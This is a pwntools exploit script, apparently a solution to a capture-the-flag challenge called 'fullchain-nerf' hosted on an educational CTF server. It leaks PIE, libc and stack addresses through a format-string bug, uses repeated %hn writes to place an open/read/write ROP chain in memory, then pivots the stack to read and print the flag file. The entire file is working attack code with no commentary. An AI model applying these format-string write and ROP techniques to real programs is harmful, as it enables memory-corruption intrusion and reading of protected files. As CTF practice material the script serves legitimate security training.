from pwn import *

context.arch = "amd64"
# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# Create Process
# r = gdb.debug("./fullchain-nerf/share/fullchain-nerf",
#               """
#               aslr on
#               # b *chal+76
#               b *chal+395
#               # b mywrite
#               c
#               set exception-verbose on
#               """)
# r = process("./fullchain-nerf/share/fullchain-nerf")
r = remote("edu-ctf.zoolab.org", 30206)

# Helper
def send_cmd2srv(obj: str, cmd: str, payload: bytes = b""):
    r.sendlineafter(b"global or local > ", obj.encode())
    r.sendlineafter(b"set, read or write > ", cmd.encode())
    
    if len(payload):
        r.sendlineafter(b"length > ", str(len(payload)).encode())
        r.send(payload)

def create_format_str(value: int):
    result = []

    for i in range(4):
        result.append({
            "key": 11 + i,
            "value": (value >> i * 16) & 0xFFFF
        })
    result[3]["key"] = 16

    result = sorted(result, key=lambda x: x["value"])

    # Generate Payload
    payload = ""
    tmp = len(payload)
    for i in range(4):
        if result[i]['value'] - tmp > 0:
            payload += f"%14${result[i]['value'] - tmp}c"
        payload += f"%{result[i]['key']}$hn"
        tmp = result[i]['value']
    payload+="\0"

    # log.info("FINAL Format String Payload (Stack_Target) : " + payload + "\n")
    return payload.encode()

def setup_override_payload(addr: int, cnt: int=0x3):
    payload = flat(
        0, addr, addr+2, addr+4)
    payload += p32(0) + p32(cnt)  # 16 Times
    payload += flat(
        addr+6
    )

    return payload

def format_str_write_addr(addr: int, value: int):

    send_cmd2srv("local", "read", setup_override_payload(addr, cnt=0x22))
    send_cmd2srv("global", "read", create_format_str(value))
    send_cmd2srv("global", "write")

# Leak All Address
payload = b"%17$lx|%19$lx|%7$lx\n"

send_cmd2srv("global", "read", payload)
send_cmd2srv("global", "write")

tmp = r.recvline().split(b"|")

PIE_BASE = int(tmp[0].decode(), 16) - 100 - 0x15fd
LIBC_BASE = int(tmp[1].decode(), 16) - 243 - 0x26fc0
GLOBAL_VAR_POS = int(tmp[2].decode(), 16)

log.info("PIE_BASE: " + hex(PIE_BASE))
log.info("LIBC_BASE: " + hex(LIBC_BASE))
log.info("GLOBAL_VAR_POS: " + hex(GLOBAL_VAR_POS))

# Prepare All Gadgets
POP_RDX_RBX = LIBC_BASE + 0x162866
POP_RDI = LIBC_BASE + 0x26b72
POP_RAX = LIBC_BASE + 0x4a550
POP_RSI = LIBC_BASE + 0x27529
SYSCALL_RET = LIBC_BASE + 0x66229
STACK_PIVOT_RET = LIBC_BASE + 0x5aa48
FINAL_STACK_PIVOT = GLOBAL_VAR_POS + 0x50

# ROP Gadget Start
FLAG_PATH = "/home/fullchain-nerf/flag"
FLAG_LENGTH = 0x40

rops = [
    FINAL_STACK_PIVOT,
    # OPEN
    POP_RAX, 2,
    POP_RDI, GLOBAL_VAR_POS,
    POP_RSI, 0,
    POP_RDX_RBX, 0, 0,
    SYSCALL_RET,

    # READ
    POP_RAX, 0,
    POP_RDI, 3,
    POP_RSI, GLOBAL_VAR_POS,
    POP_RDX_RBX, FLAG_LENGTH, 0,
    SYSCALL_RET,

    # Write
    POP_RAX, 1,
    POP_RDI, 1,
    POP_RSI, GLOBAL_VAR_POS,
    POP_RDX_RBX, FLAG_LENGTH, 0,
    SYSCALL_RET
]

log.info("ROP CHAIN LENGTH: " + str(len(rops) * 8) + ", " + str(len(rops)) + " Format STRING to Write")

# Write ROP Chain with Format String

for i in range(len(rops)):
    format_str_write_addr(FINAL_STACK_PIVOT + i * 8, rops[i])

# Finalize

payload = flat(
    0, 0, 0, 0)
payload += p32(0) + p32(0x1)  # 16 Times
payload += flat(
    0,
    FINAL_STACK_PIVOT,
    STACK_PIVOT_RET
)
send_cmd2srv("local", "read", payload)
send_cmd2srv("global", "read", (FLAG_PATH+"\0").encode())

log.info("FINAL OVERFLOW DONE!")

r.recvline()
print("Final Flag: " + r.recvline().decode())